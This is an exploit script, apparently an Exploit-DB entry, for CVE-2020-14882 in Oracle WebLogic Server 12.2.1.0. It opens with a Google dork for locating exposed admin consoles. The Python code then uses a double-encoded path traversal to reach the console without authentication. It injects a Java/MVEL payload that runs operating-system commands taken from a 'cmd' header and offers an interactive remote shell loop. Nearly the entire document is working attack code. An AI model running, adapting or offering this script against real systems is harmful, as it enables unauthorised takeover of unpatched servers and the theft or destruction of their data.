# Exploit Title: Oracle WebLogic Server 12.2.1.0 - RCE (Unauthenticated)
# Google Dork: inurl:"/console/login/LoginForm.jsp"
# Date: 01/26/2021
# Exploit Author: CHackA0101
# Vendor Homepage: https://www.oracle.com/security-alerts/cpuoct2020.html
# Version: Oracle WebLogic Server, version 12.2.1.0
# Tested on: Oracle WebLogic Server, version 12.2.1.0 (OS: Linux PDT 2017 x86_64 GNU/Linux)
# Software Link: https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html
# CVE : CVE-2020-14882

# More Info: https://github.com/chacka0101/exploits/blob/master/CVE-2020-14882/README.md

#!/usr/bin/python3

import requests
import argparse
import http.client
http.client.HTTPConnection._http_vsn=10
http.client.HTTPConnection._http_vsn_str='HTTP/1.0'
parse=argparse.ArgumentParser()
parse.add_argument('-u','--url',help='url')
args=parse.parse_args()

proxies={'http':'127.0.0.1:8080'}
cmd_=""

# Headers
headers = {
	"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15;rv:73.0)Gecko/20100101 Firefox/73.0",
	"Accept":"application/json,text/plain,*/*",
	"Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding":"gzip,deflate",
	"Upgrade-Insecure-Requests":"1",
	"Content-Type":"application/x-www-form-urlencoded",
	"Cache-Control":"max-age=0",
	"Connection":"close"
}

# Oracle WebLogic Server 12.2.1.0 - Unauthenticated RCE via python Explotation:
url=args.url+"""/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec();");"""
url_=args.url+"/console/images/%252E%252E%252Fconsole.portal"

form_data_="""_nfpb=false&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread=(weblogic.work.ExecuteThread)Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe","/c", cmd} : new String[]{"/bin/sh","-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");}executeThread.interrupt();");"""

#data_ = parse.urlencode(form_data_)
results1=requests.get(url,headers=headers)

if results1.status_code==200:
	print("(Load Headers...)\n")
	print("(Data urlencode...)\n")
	print("(Execute exploit...)\n")
	print("(CHackA0101-GNU/Linux)$ Successful Exploitation.\n")
	while True:
		cmd_test = input("(CHackA0101GNU/Linux)$ ")
		if cmd_test=="exit":
			break
		else:
			try:
				cmd_ = cmd_test
				headers = {
					'cmd': cmd_,
					'Content-Type':'application/x-www-form-urlencoded',
					'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
					'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Connection':'close',
					'Accept-Encoding':'gzip,deflate',
					'Content-Length':'1244',
					'Content-Type':'application/x-www-form-urlencoded'
				}
				results_ = requests.post(url_, data=form_data_, headers=headers, stream=True).text
				print(results_)
			except:
				pass
else:
	print("(CHackA0101-GNU/Linux)$ Fail.\n")